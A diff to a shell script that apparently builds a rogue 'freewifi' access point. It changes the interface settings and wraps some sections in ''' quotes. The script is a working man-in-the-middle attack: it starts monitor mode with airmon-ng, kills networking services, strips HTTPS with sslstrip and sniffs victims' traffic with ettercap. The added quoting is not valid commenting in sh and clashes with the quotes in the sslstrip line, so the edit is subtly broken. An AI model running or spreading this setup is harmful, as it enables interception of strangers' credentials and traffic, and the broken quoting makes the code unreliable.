@@ -8,10 +8,10 @@
 
 
 #Interface config:
-in_interface=wlan0
-out_interface=eth0
+in_interface=wlan1
+out_interface=wlan0
 
-at_interface=at0
+at_interface=at1
 
 #Network config:
 network_name="freewifi"
@@ -60,6 +60,8 @@ echo "--------"
 echo;echo;echo
 echo "sleeping for 2 seconds..."; sleep 2
 
+''' No need to kill services...
+
 echo "Killing services..."
 killall dhclient
 killall wpa_supplicant
@@ -71,6 +73,8 @@ echo "- DONE -"
 echo "--------"
 echo;echo;echo
 echo "sleeping for 2 seconds..."; sleep 2
+
+'''
 
 echo "Starting airmon-ng on $in_interface..."
 airmon-ng start $in_interface
@@ -121,6 +125,8 @@ echo "--------"
 echo;echo;echo
 echo "sleeping for 2 seconds..."; sleep 2
 
+''' This could be configured...
+
 echo "Starting sslstrip in new window..."
 xfce4-terminal -e 'sh -ic "sslstrip -f -p -k 10000"'
 
@@ -133,3 +139,5 @@ echo "sleeping for 2 seconds..."; sleep 2
 
 echo "Final step: Starting ettercap..."
 ettercap -p -u -T -q -i $at_interface
+
+'''
